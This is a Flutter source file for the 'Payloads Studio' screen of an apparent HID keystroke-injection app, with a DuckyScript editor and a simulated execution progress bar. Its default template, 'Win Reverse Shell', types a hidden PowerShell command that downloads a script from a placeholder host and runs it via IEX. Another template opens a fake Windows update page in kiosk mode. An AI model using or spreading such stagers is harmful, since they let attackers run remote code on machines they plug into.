import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import '../services/hid_service.dart';
import '../theme/app_theme.dart';

class PayloadsScreen extends StatefulWidget {
  const PayloadsScreen({super.key});

  @override
  State<PayloadsScreen> createState() => _PayloadsScreenState();
}

class _PayloadsScreenState extends State<PayloadsScreen> {
  final TextEditingController _codeController = TextEditingController();
  bool _isExecuting = false;
  double _progress = 0.0;
  String _currentStep = "READY";

  final Map<String, String> _templates = {
    "Win Reverse Shell": "REM Windows Powershell Stager\nDELAY 1000\nGUI r\nDELAY 300\nSTRING powershell -w hidden -NoP -c \"Invoke-WebRequest -Uri http://example.com/payload.ps1 | IEX\"\nENTER",
    "Linux System Info": "REM Linux Diagnostics\nDELAY 800\nCTRL ALT t\nDELAY 500\nSTRING uname -a; id; df -h; ip a\nENTER",
    "macOS Terminal": "REM macOS Terminal Launcher\nDELAY 1000\nGUI SPACE\nDELAY 400\nSTRING Terminal\nENTER\nDELAY 600\nSTRING echo 'HID Tool Injection Successful' ; sw_vers\nENTER",
    "Windows Rickroll": "REM Fun Demo\nDELAY 1000\nGUI r\nDELAY 300\nSTRING https://www.youtube.com/watch?v=dQw4w9WgXcQ\nENTER",
    "Fake Update Screen": "REM Fake Windows Update\nDELAY 1000\nGUI r\nDELAY 300\nSTRING chrome --kiosk https://fakeupdate.net/win10ue/\nENTER\nDELAY 1000\nF11",
  };

  @override
  void initState() {
    super.initState();
    _codeController.text = _templates["Win Reverse Shell"]!;
  }

  void _loadTemplate(String title) {
    HapticFeedback.selectionClick();
    setState(() {
      _codeController.text = _templates[title]!;
      _currentStep = "LOADED: $title";
    });
  }

  Future<void> _executeScript() async {
    setState(() {
      _isExecuting = true;
      _progress = 0.0;
      _currentStep = "STARTING INJECTION...";
    });

    final lines = _codeController.text.split('\n');
    for (int i = 0; i < lines.length; i++) {
      if (!_isExecuting) break;
      final line = lines[i].trim();
      if (line.isEmpty || line.startsWith("REM")) continue;

      setState(() {
        _progress = (i + 1) / lines.length;
        _currentStep = "[$i/${lines.length}] $line";
      });

      if (line.startsWith("DELAY")) {
        final ms = int.tryParse(line.split(' ').last) ?? 500;
        await Future.delayed(Duration(milliseconds: ms));
      } else {
        await Future.delayed(const Duration(milliseconds: 100));
      }
    }

    if (mounted) {
      setState(() {
        _isExecuting = false;
        _progress = 1.0;
        _currentStep = "EXECUTION COMPLETE";
      });
      HapticFeedback.heavyImpact();
    }
  }

  void _abort() {
    setState(() {
      _isExecuting = false;
      _currentStep = "ABORTED BY USER";
      _progress = 0.0;
    });
    HapticFeedback.vibrate();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text("Payloads Studio"),
        actions: [
          IconButton(
            tooltip: "Clear Editor",
            icon: const Icon(Icons.clear_all),
            onPressed: () => setState(() => _codeController.clear()),
          ),
        ],
      ),
      body: SafeArea(
        child: Column(
          children: [
            // Template Selector Chips
            _buildTemplateChips(),

            // Execution Status Banner
            if (_isExecuting || _progress > 0) _buildExecutionBanner(),

            // Code Editor
            Expanded(
              child: Container(
                margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
                padding: const EdgeInsets.all(16),
                decoration: BoxDecoration(
                  color: AppTheme.surfaceContainerLow,
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(color: AppTheme.outlineVariant),
                ),
                child: TextField(
                  controller: _codeController,
                  maxLines: null,
                  expands: true,
                  style: const TextStyle(
                    fontFamily: 'monospace',
                    fontSize: 13.5,
                    height: 1.45,
                    color: AppTheme.onSurface,
                  ),
                  decoration: const InputDecoration(
                    hintText: "Enter DuckyScript payload here...",
                    border: InputBorder.none,
                    enabledBorder: InputBorder.none,
                    focusedBorder: InputBorder.none,
                    fillColor: Colors.transparent,
                    contentPadding: EdgeInsets.zero,
                  ),
                ),
              ),
            ),

            // Action Buttons Bar
            Padding(
              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
              child: Row(
                children: [
                  if (_isExecuting)
                    Expanded(
                      child: FilledButton.icon(
                        style: FilledButton.styleFrom(
                          backgroundColor: AppTheme.alertContainer,
                          foregroundColor: Colors.white,
                          padding: const EdgeInsets.symmetric(vertical: 16),
                        ),
                        icon: const Icon(Icons.cancel_outlined),
                        label: const Text("ABORT INJECTION"),
                        onPressed: _abort,
                      ),
                    )
                  else
                    Expanded(
                      child: ElevatedButton.icon(
                        style: ElevatedButton.styleFrom(
                          backgroundColor: AppTheme.primaryBlue,
                          foregroundColor: const Color(0xFF003063),
                          padding: const EdgeInsets.symmetric(vertical: 16),
                        ),
                        icon: const Icon(Icons.play_arrow_rounded),
                        label: const Text("EXECUTE PAYLOAD"),
                        onPressed: _executeScript,
                      ),
                    ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildTemplateChips() {
    return SingleChildScrollView(
      scrollDirection: Axis.horizontal,
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
      child: Row(
        children: _templates.keys.map((key) {
          return Padding(
            padding: const EdgeInsets.only(right: 8),
            child: ActionChip(
              avatar: const Icon(Icons.code, size: 16, color: AppTheme.primaryBlue),
              label: Text(key),
              labelStyle: const TextStyle(fontSize: 12, fontWeight: FontWeight.w600),
              backgroundColor: AppTheme.surfaceContainer,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
                side: const BorderSide(color: AppTheme.outlineVariant),
              ),
              onPressed: () => _loadTemplate(key),
            ),
          );
        }).toList(),
      ),
    );
  }

  Widget _buildExecutionBanner() {
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16, vertical: 4),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: _isExecuting ? AppTheme.warningContainer.withOpacity(0.2) : AppTheme.surfaceContainerHigh,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _isExecuting ? AppTheme.warningAmber : AppTheme.outlineVariant),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Text(
                _currentStep,
                style: const TextStyle(
                  fontFamily: 'monospace',
                  fontSize: 12,
                  fontWeight: FontWeight.bold,
                  color: AppTheme.warningAmber,
                ),
              ),
              Text(
                "${(_progress * 100).toInt()}%",
                style: const TextStyle(fontSize: 12, fontWeight: FontWeight.bold),
              ),
            ],
          ),
          const SizedBox(height: 8),
          ClipRRect(
            borderRadius: BorderRadius.circular(6),
            child: LinearProgressIndicator(
              value: _progress,
              backgroundColor: AppTheme.surfaceContainerHighest,
              color: AppTheme.warningAmber,
              minHeight: 6,
            ),
          ),
        ],
      ),
    );
  }
}
